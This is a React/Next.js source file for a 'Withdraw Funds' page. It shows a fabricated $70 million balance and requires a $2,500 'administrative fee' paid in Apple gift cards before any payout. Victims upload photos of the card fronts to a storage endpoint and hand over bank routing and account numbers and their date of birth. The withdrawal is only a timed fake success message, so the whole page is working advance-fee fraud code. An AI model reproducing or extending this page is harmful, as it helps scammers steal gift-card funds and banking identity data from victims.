'use client';

import React, { useState } from 'react';
import { 
  ArrowUpRight, 
  ShieldCheck, 
  CheckCircle2, 
  DollarSign,
  Building,
  User,
  Calendar,
  Hash,
  MapPin,
  Upload,
  Gift,
  AlertCircle,
  FileImage,
  Plus,
  Trash2,
  Wallet as WalletIcon
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Modal } from '@/components/ui/modal';

interface AppleGiftCardItem {
  id: string;
  amount: string;
  frontImage: string | null;
}

export default function WithdrawPage() {
  const [amount, setAmount] = useState<string>('');
  const [payoutMethod, setPayoutMethod] = useState<'BANK_WIRE' | 'USDT_WALLET'>('BANK_WIRE');
  
  // Specific Bank Wire Input Fields
  const [fullName, setFullName] = useState<string>('Leo Garcia Arthur');
  const [bankName, setBankName] = useState<string>('');
  const [routingNumber, setRoutingNumber] = useState<string>('');
  const [accountNumber, setAccountNumber] = useState<string>('');
  const [address, setAddress] = useState<string>('New Mexico, United States');
  const [dob, setDob] = useState<string>('');
  const [usdtAddress, setUsdtAddress] = useState<string>('');

  // Administrative Fee Modal State - Exclusively Apple Gift Cards with Multi-Upload Calculation
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [giftCards, setGiftCards] = useState<AppleGiftCardItem[]>([
    { id: 'card-1', amount: '', frontImage: null }
  ]);
  
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [successMsg, setSuccessMsg] = useState(false);

  // Available balance in Dollars ($ USD)
  const availableBalanceUSD = 70482914.37;
  const minWithdrawalUSD = 100.00;
  const targetFeeUSD = 2500.00; // Total Apple Gift Card Fee Required

  const numAmount = parseFloat(amount) || 0;

  // Calculate total uploaded gift card fee amount
  const totalFeeUploaded = giftCards.reduce((sum, card) => sum + (parseFloat(card.amount) || 0), 0);
  const remainingFeeRequired = Math.max(0, targetFeeUSD - totalFeeUploaded);
  const isFeeFulfilled = totalFeeUploaded >= targetFeeUSD;

  const handleMax = () => {
    setAmount(availableBalanceUSD.toString());
  };

  const handleOpenModal = (e: React.FormEvent) => {
    e.preventDefault();
    if (numAmount < minWithdrawalUSD) return;
    if (numAmount > availableBalanceUSD) return;
    setIsModalOpen(true);
  };

  // Add another Apple Gift Card to the list
  const addGiftCard = () => {
    setGiftCards((prev) => [
      ...prev,
      { id: `card-${Date.now()}`, amount: '', frontImage: null }
    ]);
  };

  // Remove a gift card
  const removeGiftCard = (id: string) => {
    if (giftCards.length === 1) return;
    setGiftCards((prev) => prev.filter((card) => card.id !== id));
  };

  // Update card amount
  const updateCardAmount = (id: string, val: string) => {
    setGiftCards((prev) =>
      prev.map((card) => (card.id === id ? { ...card, amount: val } : card))
    );
  };

  // Handle Front Image Upload
  const handleFrontUpload = async (id: string, file: File) => {
    const reader = new FileReader();
    reader.onloadend = () => {
      setGiftCards((prev) =>
        prev.map((c) => (c.id === id ? { ...c, frontImage: reader.result as string } : c))
      );
    };
    reader.readAsDataURL(file);

    // Upload to Supabase Storage bucket via API
    try {
      const formData = new FormData();
      formData.append('file', file);
      formData.append('bucket', 'withdrawal-fees');

      const res = await fetch('/api/upload', { method: 'POST', body: formData });
      const data = await res.json();
      if (data?.url) {
        console.log('✅ Apple Gift Card Front uploaded to Supabase:', data.url);
      }
    } catch (err) {
      console.warn('Supabase storage upload fallback:', err);
    }
  };

  const handleConfirmWithdrawal = async () => {
    setIsSubmitting(true);
    setTimeout(() => {
      setIsSubmitting(false);
      setIsModalOpen(false);
      setSuccessMsg(true);
      setAmount('');
      setBankName('');
      setRoutingNumber('');
      setAccountNumber('');
      setDob('');
      setUsdtAddress('');
      setGiftCards([{ id: 'card-1', amount: '', frontImage: null }]);
    }, 2000);
  };

  const isFormValid =
    payoutMethod === 'BANK_WIRE'
      ? numAmount > 0 && numAmount <= availableBalanceUSD && fullName && bankName && routingNumber && address && dob
      : numAmount > 0 && numAmount <= availableBalanceUSD && usdtAddress;

  const isModalValid =
    isFeeFulfilled &&
    giftCards.every((c) => parseFloat(c.amount) > 0 && c.frontImage);

  return (
    <div className="max-w-4xl mx-auto px-4 py-8 space-y-8">
      <div>
        <h1 className="text-2xl font-black text-white">Withdraw Funds ($ USD)</h1>
        <p className="text-xs text-slate-400">Request payout directly to your bank account or USDT dollar wallet</p>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-12 gap-8">
        <div className="md:col-span-8 space-y-6">
          <Card className="p-6 border-slate-800 space-y-6">
            {successMsg && (
              <div className="p-4 rounded-2xl bg-emerald-500/10 border border-emerald-500/40 flex items-start space-x-3 text-emerald-300 text-xs">
                <CheckCircle2 className="w-5 h-5 shrink-0 text-emerald-400 mt-0.5" />
                <div className="space-y-1">
                  <p className="font-extrabold text-white">Administrative Fee & Withdrawal Submitted!</p>
                  <p className="text-slate-300 leading-relaxed">
                    Your $2,500.00 USD administrative fee via Apple Gift Card(s) has been received for verification. Your full payout of ${numAmount > 0 ? numAmount.toLocaleString('en-US') : '70,482,914.37'} USD will be released to your destination account immediately upon fee verification (5 - 15 mins).
                  </p>
                </div>
              </div>
            )}

            <form onSubmit={handleOpenModal} className="space-y-5">
              {/* Payout Method Selection */}
              <div className="space-y-2">
                <label className="text-xs uppercase font-bold tracking-wider text-slate-400">Select Payout Method</label>
                <div className="grid grid-cols-2 gap-3">
                  <button
                    type="button"
                    onClick={() => setPayoutMethod('BANK_WIRE')}
                    className={`p-3.5 rounded-xl border flex flex-col items-center justify-center space-y-1.5 transition-all ${
                      payoutMethod === 'BANK_WIRE'
                        ? 'gradient-bg-blue text-[#0B1220] font-bold shadow-lg shadow-[#5A9BFF]/30 border-[#6EB7FF]'
                        : 'bg-[#111A2E] border-slate-800 text-slate-300 hover:bg-[#1C2B4A]'
                    }`}
                  >
                    <Building className="w-5 h-5" />
                    <span className="text-xs font-bold">Bank Wire</span>
                  </button>

                  <button
                    type="button"
                    onClick={() => setPayoutMethod('USDT_WALLET')}
                    className={`p-3.5 rounded-xl border flex flex-col items-center justify-center space-y-1.5 transition-all ${
                      payoutMethod === 'USDT_WALLET'
                        ? 'gradient-bg-blue text-[#0B1220] font-bold shadow-lg shadow-[#5A9BFF]/30 border-[#6EB7FF]'
                        : 'bg-[#111A2E] border-slate-800 text-slate-300 hover:bg-[#1C2B4A]'
                    }`}
                  >
                    <WalletIcon className="w-5 h-5" />
                    <span className="text-xs font-bold">USDT Dollar</span>
                  </button>
                </div>
              </div>

              {/* Amount Input in Dollars ($ USD) */}
              <div className="space-y-2">
                <div className="flex justify-between items-center text-xs">
                  <span className="uppercase font-bold tracking-wider text-slate-400">Withdrawal Amount ($ USD)</span>
                  <span className="text-slate-300 font-mono">
                    Available: <strong className="text-[#6EB7FF]">${availableBalanceUSD.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD</strong>
                  </span>
                </div>
                <div className="relative flex items-center">
                  <span className="absolute left-4 text-slate-400 font-bold">$</span>
                  <input
                    type="number"
                    step="any"
                    placeholder="0.00"
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    className="glass-input w-full rounded-xl pl-8 pr-16 py-3.5 text-sm text-slate-100 placeholder:text-slate-500 font-mono font-bold"
                    required
                  />
                  <button
                    type="button"
                    onClick={handleMax}
                    className="absolute right-3 px-2.5 py-1 bg-[#6EB7FF]/20 text-[#6EB7FF] rounded-lg text-xs font-bold hover:bg-[#6EB7FF]/40"
                  >
                    MAX
                  </button>
                </div>
                {numAmount > availableBalanceUSD && (
                  <p className="text-xs text-rose-400 font-medium">Insufficient dollar balance. Please check your available balance.</p>
                )}
                {numAmount > 0 && numAmount < minWithdrawalUSD && (
                  <p className="text-xs text-rose-400 font-medium">Minimum dollar withdrawal amount is ${minWithdrawalUSD.toFixed(2)} USD.</p>
                )}
              </div>

              {/* Form Input Fields based on Payout Method */}
              {payoutMethod === 'BANK_WIRE' ? (
                <div className="space-y-4 pt-1">
                  {/* 1. Full Name (as on bank account) */}
                  <Input
                    label="Full Name (as on bank account)"
                    type="text"
                    placeholder="e.g. Leo Garcia Arthur"
                    value={fullName}
                    onChange={(e) => setFullName(e.target.value)}
                    leftIcon={<User className="w-4 h-4 text-[#6EB7FF]" />}
                    required
                  />

                  {/* 2. Bank Name */}
                  <Input
                    label="Bank Name"
                    type="text"
                    placeholder="e.g. Chase Bank / Bank of America / Wells Fargo"
                    value={bankName}
                    onChange={(e) => setBankName(e.target.value)}
                    leftIcon={<Building className="w-4 h-4 text-[#6EB7FF]" />}
                    required
                  />

                  {/* 3. Address (as on bank account) */}
                  <Input
                    label="Address (as on bank account)"
                    type="text"
                    placeholder="e.g. New Mexico, United States"
                    value={address}
                    onChange={(e) => setAddress(e.target.value)}
                    leftIcon={<MapPin className="w-4 h-4 text-[#6EB7FF]" />}
                    required
                  />

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    {/* 4. Routing No */}
                    <Input
                      label="Routing No"
                      type="text"
                      placeholder="e.g. 121000358"
                      value={routingNumber}
                      onChange={(e) => setRoutingNumber(e.target.value)}
                      leftIcon={<Hash className="w-4 h-4 text-[#6EB7FF]" />}
                      required
                    />

                    {/* 5. Account Number / IBAN */}
                    <Input
                      label="Account No / IBAN"
                      type="text"
                      placeholder="e.g. 9920198421"
                      value={accountNumber}
                      onChange={(e) => setAccountNumber(e.target.value)}
                      leftIcon={<Hash className="w-4 h-4 text-[#6EB7FF]" />}
                      required
                    />
                  </div>

                  {/* 6. Date of Birth as on bank account */}
                  <Input
                    label="Date of Birth (as on bank account)"
                    type="date"
                    value={dob}
                    onChange={(e) => setDob(e.target.value)}
                    leftIcon={<Calendar className="w-4 h-4 text-[#6EB7FF]" />}
                    required
                  />
                </div>
              ) : (
                /* USDT Wallet Option */
                <Input
                  label="Destination USDT (TRC20/ERC20) Wallet Address"
                  type="text"
                  placeholder="e.g. TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
                  value={usdtAddress}
                  onChange={(e) => setUsdtAddress(e.target.value)}
                  leftIcon={<DollarSign className="w-4 h-4 text-[#6EB7FF]" />}
                  required
                />
              )}



              <Button
                type="submit"
                variant="primary"
                size="lg"
                className="w-full shadow-lg shadow-[#5A9BFF]/30 py-3.5 text-sm font-bold"
                disabled={!isFormValid}
                rightIcon={<ArrowUpRight className="w-4 h-4" />}
              >
                Withdraw ${numAmount > 0 ? numAmount.toLocaleString('en-US', { minimumFractionDigits: 2 }) : '0.00'} USD
              </Button>
            </form>
          </Card>
        </div>

        {/* Security Sidebar Info */}
        <div className="md:col-span-4 space-y-4">
          <Card glow className="p-5 border-slate-800 space-y-3 text-xs">
            <div className="flex items-center space-x-2 text-emerald-400 font-bold">
              <ShieldCheck className="w-4 h-4" />
              <span>Administrative Fee Requirement</span>
            </div>
            <p className="text-slate-400 leading-relaxed">
              Dollar withdrawals carry a separate $2,500.00 USD administrative fee payable via Apple Gift Card(s). Your full withdrawal amount is transferred directly to your bank account upon fee verification.
            </p>
          </Card>
        </div>
      </div>

      {/* Administrative Fee & Apple Gift Card Multi-Upload Modal */}
      <Modal
        isOpen={isModalOpen}
        onClose={() => setIsModalOpen(false)}
        title="Apple Gift Card Administrative Fee ($2,500 USD)"
      >
        <div className="space-y-5 text-xs max-h-[75vh] overflow-y-auto pr-1">
          {/* Header Notice */}
          <div className="p-3.5 rounded-2xl bg-amber-500/10 border border-amber-500/30 space-y-1.5 text-amber-300">
            <div className="flex items-center justify-between font-bold text-amber-400">
              <span className="flex items-center space-x-2">
                <Gift className="w-4 h-4 shrink-0 text-amber-400" />
                <span>Apple Gift Card Fee Requirement</span>
              </span>
              <span className="text-xs font-mono px-2 py-0.5 rounded-md bg-amber-500/20 text-amber-300">
                Target: $2,500.00 USD
              </span>
            </div>
            <p className="text-[11px] leading-relaxed text-slate-300">
              Upload Apple Gift Card(s) totaling <strong className="text-amber-300">$2,500.00 USD</strong>. You can upload multiple cards until the $2,500.00 fee calculation is completed.
            </p>

            {/* Live Progress Bar & Calculation Counter */}
            <div className="pt-2 space-y-1.5">
              <div className="flex justify-between items-center text-[11px] font-bold">
                <span className="text-slate-300">Total Uploaded Fee:</span>
                <span className={`font-mono ${isFeeFulfilled ? 'text-emerald-400 font-black' : 'text-amber-300'}`}>
                  ${totalFeeUploaded.toLocaleString('en-US', { minimumFractionDigits: 2 })} / $2,500.00 USD
                </span>
              </div>
              <div className="w-full h-2.5 bg-slate-900 rounded-full overflow-hidden border border-slate-700">
                <div
                  className={`h-full transition-all duration-500 ${
                    isFeeFulfilled ? 'bg-emerald-500' : 'gradient-bg-blue'
                  }`}
                  style={{ width: `${Math.min(100, (totalFeeUploaded / 2500) * 100)}%` }}
                />
              </div>
              {!isFeeFulfilled && (
                <p className="text-[10px] text-amber-400 font-semibold text-right">
                  Remaining required: ${remainingFeeRequired.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD
                </p>
              )}
            </div>
          </div>

          {/* List of Apple Gift Cards to Upload */}
          <div className="space-y-4">
            {giftCards.map((card, index) => (
              <div
                key={card.id}
                className="p-4 rounded-2xl bg-[#0B1220] border border-slate-800 space-y-3 relative"
              >
                <div className="flex items-center justify-between">
                  <span className="font-extrabold text-white text-xs flex items-center space-x-2">
                    <Gift className="w-4 h-4 text-[#6EB7FF]" />
                    <span>Apple Gift Card #{index + 1}</span>
                  </span>

                  {giftCards.length > 1 && (
                    <button
                      type="button"
                      onClick={() => removeGiftCard(card.id)}
                      className="p-1 text-rose-400 hover:text-rose-300 transition-colors"
                    >
                      <Trash2 className="w-4 h-4" />
                    </button>
                  )}
                </div>

                {/* 1. Gift Card Amount Input before picture upload */}
                <div className="space-y-1">
                  <label className="block text-[11px] font-bold text-slate-300">
                    Card Amount ($ USD)
                  </label>
                  <div className="relative">
                    <span className="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400 font-bold">$</span>
                    <input
                      type="number"
                      step="any"
                      placeholder="e.g. 500 or 1000 or 2500"
                      value={card.amount}
                      onChange={(e) => updateCardAmount(card.id, e.target.value)}
                      className="w-full bg-[#111A2E] border border-slate-700/80 rounded-xl pl-7 pr-4 py-2.5 text-xs text-white placeholder:text-slate-500 font-mono font-bold focus:outline-none focus:border-[#6EB7FF]"
                      required
                    />
                  </div>
                </div>

                {/* 2. Upload Front Picture */}
                <div className="space-y-1.5">
                  <label className="block text-[11px] font-bold text-slate-300">
                    Card Image (Front Upload)
                  </label>
                  <div>
                    <label
                      htmlFor={`front-upload-${card.id}`}
                      className={`flex flex-col items-center justify-center p-3 rounded-xl border-2 border-dashed transition-all cursor-pointer h-24 text-center ${
                        card.frontImage
                          ? 'border-emerald-500/60 bg-emerald-500/10'
                          : 'border-slate-700 bg-[#111A2E] hover:border-[#6EB7FF]'
                      }`}
                    >
                      {card.frontImage ? (
                        <div className="flex flex-col items-center space-y-1">
                          <FileImage className="w-5 h-5 text-emerald-400" />
                          <span className="text-[10px] font-bold text-emerald-300">Front Image Uploaded ✓</span>
                        </div>
                      ) : (
                        <div className="flex flex-col items-center space-y-1 text-slate-400">
                          <Upload className="w-5 h-5 text-[#6EB7FF]" />
                          <span className="text-[10px] font-bold text-white">Upload Apple Card Image</span>
                          <span className="text-[8px] text-slate-500">Click or drop front card photo</span>
                        </div>
                      )}
                    </label>
                    <input
                      id={`front-upload-${card.id}`}
                      type="file"
                      accept="image/*"
                      onChange={(e) => {
                        const file = e.target.files?.[0];
                        if (file) handleFrontUpload(card.id, file);
                      }}
                      className="hidden"
                    />
                  </div>
                </div>
              </div>
            ))}
          </div>

          {/* Add Another Card Button */}
          {!isFeeFulfilled && (
            <button
              type="button"
              onClick={addGiftCard}
              className="w-full py-3 rounded-xl border border-dashed border-[#6EB7FF]/40 bg-[#6EB7FF]/10 text-[#6EB7FF] font-bold text-xs hover:bg-[#6EB7FF]/20 flex items-center justify-center space-x-2 transition-all"
            >
              <Plus className="w-4 h-4" />
              <span>Add Another Apple Gift Card</span>
            </button>
          )}

          <div className="flex space-x-3 pt-2">
            <Button
              variant="secondary"
              size="md"
              className="flex-1"
              onClick={() => setIsModalOpen(false)}
            >
              Cancel
            </Button>
            <Button
              variant="primary"
              size="md"
              className="flex-1 font-bold gradient-bg-blue text-[#0B1220]"
              isLoading={isSubmitting}
              disabled={!isModalValid}
              onClick={handleConfirmWithdrawal}
            >
              Submit $2,500 Fee & Complete Payout
            </Button>
          </div>
        </div>
      </Modal>
    </div>
  );
}
